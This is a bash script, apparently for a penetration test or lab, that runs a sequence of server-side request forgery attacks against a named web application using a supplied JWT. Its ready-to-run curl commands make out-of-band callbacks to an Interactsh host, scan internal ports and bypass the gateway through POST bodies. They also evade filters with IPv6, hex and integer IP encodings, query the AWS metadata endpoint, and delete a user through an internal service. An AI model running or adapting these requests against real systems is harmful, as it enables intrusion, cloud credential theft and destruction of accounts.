#!/bin/bash

# ============================================================
# QUICK SSRF BLACKBOX TEST SCRIPT
# Target: https://quangtx.io.vn
# Usage: ./quick-ssrf-test.sh YOUR_JWT_TOKEN
# ============================================================

TARGET="https://quangtx.io.vn"
TOKEN="$1"

if [ -z "$TOKEN" ]; then
    echo "❌ ERROR: JWT token required"
    echo "Usage: $0 YOUR_JWT_TOKEN"
    echo ""
    echo "Get token by:"
    echo "  1. Login to https://quangtx.io.vn"
    echo "  2. Open DevTools > Network"
    echo "  3. Copy JWT token from Authorization header"
    exit 1
fi

echo "============================================================"
echo "🎯 SSRF BLACKBOX TESTING"
echo "Target: $TARGET"
echo "Token: ${TOKEN:0:20}..."
echo "============================================================"
echo ""

# ============================================================
# TEST 1: Out-of-Band Detection (Interactsh)
# ============================================================
echo "📡 [TEST 1] Out-of-Band Detection..."
echo "Setting up Interactsh callback URL..."

# Generate interactsh URL
INTERACTSH_URL=$(curl -s https://interactsh.com/api/register | jq -r '.url' 2>/dev/null || echo "test123.interact.sh")
echo "Callback URL: $INTERACTSH_URL"

echo ""
echo "Testing fetch_review endpoint..."
curl -s -X POST "$TARGET/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d "{\"review_url\": \"https://$INTERACTSH_URL/ssrf-test\"}" \
     -w "\nHTTP Status: %{http_code}\n" | head -20

echo ""
echo "✓ Check https://interactsh.com for callbacks"
echo "  If you see HTTP request → SSRF CONFIRMED! ✅"
echo ""
read -p "Press Enter to continue..."

# ============================================================
# TEST 2: Internal Service Enumeration
# ============================================================
echo ""
echo "🔍 [TEST 2] Internal Service Scanning..."
echo "Scanning localhost ports 8080-8084..."
echo ""

for port in 8080 8081 8082 8083 8084; do
    echo "Testing port $port..."
    RESPONSE=$(curl -s -X POST "$TARGET/api/products/1/fetch_review" \
         -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
         -d "{\"review_url\": \"http://localhost:$port/\"}" \
         -w "\nHTTP_STATUS:%{http_code}|TIME:%{time_total}" \
         --max-time 5 2>&1)
    
    STATUS=$(echo "$RESPONSE" | grep -oP 'HTTP_STATUS:\K\d+' || echo "timeout")
    TIME=$(echo "$RESPONSE" | grep -oP 'TIME:\K[\d\.]+' || echo "N/A")
    
    if [ "$STATUS" == "200" ]; then
        echo "  ✅ Port $port OPEN - Service running!"
    elif [ "$STATUS" == "403" ]; then
        echo "  🛡️ Port $port blocked by gateway"
    elif [ "$STATUS" == "timeout" ]; then
        echo "  ⏱️ Port $port timeout (filtered or closed)"
    else
        echo "  ❌ Port $port closed (status: $STATUS)"
    fi
done
echo ""

# ============================================================
# TEST 3: Gateway Bypass - POST Body
# ============================================================
echo ""
echo "🔓 [TEST 3] Gateway Bypass - POST Body..."
echo ""

echo "Test A: Query parameter (will be BLOCKED)..."
curl -s -X GET "$TARGET/api/products/1/check_price?compare_url=http://localhost:8081" \
     -H "Authorization: Bearer $TOKEN" \
     -w "\nHTTP Status: %{http_code}\n" | head -10

echo ""
echo "Test B: POST body (should BYPASS gateway)..."
curl -s -X POST "$TARGET/api/products/1/check_price" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"compare_url": "http://localhost:8081/api/users"}' \
     -w "\nHTTP Status: %{http_code}\n" | head -20

echo ""
echo "✓ If Test B returns 200 with data → Gateway bypassed! ✅"
echo ""

# ============================================================
# TEST 4: URL Encoding Bypass
# ============================================================
echo ""
echo "🎭 [TEST 4] URL Encoding Bypass..."
echo ""

echo "Test A: IPv6 localhost [::1]..."
curl -s -X POST "$TARGET/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://[::1]:8081/api/users"}' \
     -w "\nHTTP Status: %{http_code}\n" | head -15

echo ""
echo "Test B: Hex encoded IP (0x7f000001 = 127.0.0.1)..."
curl -s -X POST "$TARGET/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://0x7f000001:8081/api/users"}' \
     -w "\nHTTP Status: %{http_code}\n" | head -15

echo ""
echo "Test C: Integer IP (2130706433 = 127.0.0.1)..."
curl -s -X POST "$TARGET/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://2130706433:8081/api/users"}' \
     -w "\nHTTP Status: %{http_code}\n" | head -15

echo ""

# ============================================================
# TEST 5: Cloud Metadata Attack
# ============================================================
echo ""
echo "☁️  [TEST 5] Cloud Metadata Attack..."
echo ""

echo "Testing AWS metadata endpoint..."
curl -s -X POST "$TARGET/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://169.254.169.254/latest/meta-data/"}' \
     -w "\nHTTP Status: %{http_code}\n" | head -20

echo ""

# ============================================================
# TEST 6: Privilege Escalation - Delete User
# ============================================================
echo ""
echo "🔥 [TEST 6] Privilege Escalation - Delete User via SSRF..."
echo ""

echo "Attempting to delete user ID 2 via SSRF (IP whitelist bypass)..."
curl -s -X POST "$TARGET/api/products/1/share" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"share_api_url": "http://user-service:8081/api/users/delete/2"}' \
     -w "\nHTTP Status: %{http_code}\n"

echo ""
echo "✓ If status 200 with 'deleted' → Privilege escalation successful! ⚠️"
echo ""

# ============================================================
# TEST 7: Avatar Validation SSRF
# ============================================================
echo ""
echo "🖼️  [TEST 7] Avatar Validation SSRF..."
echo ""

echo "Testing avatar validate endpoint..."
curl -s -X POST "$TARGET/api/users/me/avatar/validate" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"url": "http://localhost:8081/api/users"}' \
     -w "\nHTTP Status: %{http_code}\n" | head -20

echo ""

# ============================================================
# SUMMARY
# ============================================================
echo "============================================================"
echo "📊 TESTING SUMMARY"
echo "============================================================"
echo ""
echo "✅ COMPLETED TESTS:"
echo "  [1] Out-of-band detection (Interactsh callback)"
echo "  [2] Internal service port scanning"
echo "  [3] Gateway bypass via POST body"
echo "  [4] URL encoding bypass techniques"
echo "  [5] Cloud metadata endpoint attack"
echo "  [6] Privilege escalation attempt"
echo "  [7] Avatar validation SSRF"
echo ""
echo "🔍 MANUAL VERIFICATION NEEDED:"
echo "  • Check Interactsh for callbacks: https://interactsh.com"
echo "  • Review response content for internal data leakage"
echo "  • Test with Burp Suite for detailed analysis"
echo "  • Check server logs for SSRF attempts"
echo ""
echo "📋 NEXT STEPS:"
echo "  1. Review BLACKBOX-SSRF-DISCOVERY-GUIDE.md for details"
echo "  2. Test redirect chain bypass (requires external server)"
echo "  3. Test DNS rebinding attack"
echo "  4. Setup automated scanning with Nuclei/Burp"
echo ""
echo "============================================================"
echo "✓ Testing complete!"
echo "============================================================"
